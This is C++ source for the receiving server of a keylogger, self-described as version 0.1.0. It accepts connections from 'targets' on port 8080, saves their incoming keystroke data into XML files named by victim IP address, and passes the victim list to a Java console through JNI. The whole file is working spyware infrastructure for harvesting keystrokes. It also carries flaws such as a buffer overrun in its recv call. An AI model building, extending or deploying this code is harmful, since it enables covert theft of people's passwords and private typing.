#include <winsock2.h>
#include <mswsock.h>
#include "ServerInterProcess.h"
#include "keyloggerinterface.h"
#include <stdio.h>
#include <stdlib.h>
#include <thread>
#include <mutex>
#include <fcntl.h>
#include <io.h>
#include <jni.h>
HANDLE mu;
SOCKETLIST *head;
JavaVM* jvm;
JNIEnv* env;
int ConnectionCount;

 JNICALL jobjectArray getBuffer()
  {

    jclass cls = env->FindClass("keyloggerinterface/keylogdata");
    jmethodID cid = env->GetMethodID(cls,"<init>", "(JLjava/lang/String;)V");
    SOCKETLIST *sl_h,*sl_c ;
    jobjectArray ret = env->NewObjectArray(ConnectionCount,cls,NULL);
    WaitForSingleObject(mu,INFINITE);
    if(head->target != NULL)
    {
        sl_h = sl_c= head;

        for(int x=0; x< ConnectionCount; x++)
        {
            jlong ipadd = sl_c->IPADDR;
            jstring str = env->NewStringUTF(const_cast<char*>(sl_c->name));

            env->SetObjectArrayElement(ret,x,env->NewObject(cls,cid,ipadd,str));
            sl_c =sl_c->nextTarget;
        }
        while ((sl_c) != sl_h);
    }
    ReleaseMutex(mu);
      return ret;
  }
void Listener()
{

    WSADATA WSA;
    SOCKET Listener;
    SOCKADDR_IN server, target;
    head= static_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
    (head->nextTarget)=0x00;
    (head->target)=0x00;
    SYSTEMTIME timestamp;

    WaitForSingleObject(mu,INFINITE);
    ReleaseMutex(mu);

    int cL;
    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    fprintf(stderr ,"\t[*] Initalizing socket...\n");
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return;
    }
    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
        return;
    }
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
        return;
    }

    listen(Listener,3);
    cL=sizeof(target);
    char* name;
    while(true)
    {
        SOCKET *acceptedTarget = reinterpret_cast<SOCKET*>(malloc(sizeof(SOCKET)));
        *acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
        SOCKETLIST *link = reinterpret_cast<SOCKETLIST*>(malloc(sizeof(SOCKETLIST)));
        if(*acceptedTarget==INVALID_SOCKET)
        {
            fprintf(stderr ,"\n\t\t[*] error connecting");
        }
        else
        {

            u_long mode =1;
            WaitForSingleObject(mu,INFINITE);
            ioctlsocket(*acceptedTarget,FIONBIO,&mode);
            name = static_cast<char*>(malloc(0x100));
            link->name = name;
            link->target = acceptedTarget;
            /*
                if a file from the same ip is created at the same time then the naming convention
                may fail. try again for a new time_stamp.
            */
            do
            {
                GetSystemTime(&timestamp);
                sprintf(link->name,".\\logged\\%d_Log%d-%d-%d-%d.xml",htonl(target.sin_addr.S_un.S_addr),
                    timestamp.wHour,timestamp.wMinute,timestamp.wSecond,timestamp.wMilliseconds);
                link->FileDescriptor = CreateFileA(link->name,(GENERIC_READ|GENERIC_WRITE),
                                               FILE_SHARE_READ,NULL,CREATE_ALWAYS,
                                               FILE_ATTRIBUTE_NORMAL,NULL);

            }while(link->FileDescriptor == INVALID_HANDLE_VALUE);

            SetFilePointer(link->FileDescriptor,0x00,NULL,FILE_BEGIN);
             WriteFile(link->FileDescriptor,
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n",
                strlen("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n"),NULL,NULL);

            /*
                establish a self referential linked list,
                    A->B->C->A...
                each link contains a socket so the listener thread can read data off of the
                socket.
            */
            link->IPADDR = htonl(target.sin_addr.S_un.S_addr);
            if((head->target)==0x00)
            {
                *head=*link;
                head->nextTarget=head;
            }
            else
            {
                link->nextTarget=head->nextTarget;
                head->nextTarget=link;
            }
            ConnectionCount++;
            ReleaseMutex(mu);

        }

    }

}

void Handler()
{
        unsigned int rcv;
        char* buffer = static_cast<char *>(malloc(0x1000));
        SOCKETLIST *link;
        SOCKETLIST previousLink;
        while(1)
        {

            while(head==nullptr ||(head->target)== NULL )
                Sleep(1);
            WaitForSingleObject(mu,INFINITE);

                link=head;
            ReleaseMutex(mu);
            while((head->target)!=NULL)
            {

                while(recv(*(link->target),buffer,0x1001,0) !=  SOCKET_ERROR )
                {
                        *(buffer+0x1000)=0x00;
                        WriteFile(link->FileDescriptor,buffer,strlen(buffer),NULL,NULL);
                        WriteFile(link->FileDescriptor,"\n</KeyLoggerMetaData>\n",
                                  strlen("\n</KeyLoggerMetaData>\n"),NULL,NULL);
                        SetFilePointer(link->FileDescriptor,((-1)*strlen("\n</KeyLoggerMetaData>\n")),NULL,FILE_CURRENT);
                }
                if (WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    Sleep(1);
                    WSASetLastError(0x00);
                    link = (link->nextTarget);
                    Sleep(1); //give up a millisecond to stop heavy disk right from crashing the program
                }
                else
                {
                    SOCKETLIST temp = *(link->nextTarget);
                   if( link->target == temp.target)
                    {
                        WaitForSingleObject(mu,INFINITE);
                        head->target=0x00;
                        head->nextTarget=0x00;
                        ReleaseMutex(mu);
                    }
                    else
                    {

                      WaitForSingleObject(mu,INFINITE);
                      link->target = link->nextTarget->target;
                      link->nextTarget=link->nextTarget->nextTarget;
                      head = link;
                      ReleaseMutex(mu);
                    }
                    ConnectionCount--;
                }

            }
        }
}
/**
    this is a temporary server used for testing, future changes will be established
*/
int main()
{
    ConnectionCount=0;

    mu = CreateMutex(NULL,false,NULL);

    WaitForSingleObject(mu,INFINITE);
    sched_param sch_params;
    sch_params.sched_priority =THREAD_PRIORITY_HIGHEST;
    std::thread thread1 (Listener);
    if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
    {
        printf("[*] priority of connection listener increased successfully!\n");
    }
    std::thread thread2 (Handler);
    pthread_setschedparam(thread2.native_handle(),SCHED_RR,&sch_params);
    if(pthread_setschedparam(thread1.native_handle(),SCHED_RR,&sch_params))
    {
        printf("[*] priority of data listener increased successfully!\n");
    }
    ReleaseMutex(mu);
    Sleep(100);
    JavaVMInitArgs args;
    JavaVMOption *option = new JavaVMOption[1];
    option[0].optionString= const_cast<char*>("-Djava.class.path=C:\\Users\\Qu3b411\\Documents\\NetBeansProjects\\KeyLoggerInterface\\build\\classes;"),NULL;
    args.version = JNI_VERSION_1_8;
    args.nOptions = 1;
    args.options = option;
    args.ignoreUnrecognized = false;
    jint k = JNI_CreateJavaVM(&jvm,reinterpret_cast<void**>(&env),&args);
    if (k != JNI_OK)
    {
        return -1;
    }
    jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
    JNINativeMethod methods[] = {"getBuffer", "()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;", (void*)&getBuffer};
    jmethodID Init = env->GetMethodID(cls,"<init>","()V");
    jobject obj = env->NewObject(cls,Init);
    env->RegisterNatives(cls,methods,1);
    jmethodID Init_Gui = env->GetMethodID(cls,"Console","()V");
    env->CallVoidMethod(obj,Init_Gui);
    delete option;
    thread1.join();


    return 0;
}
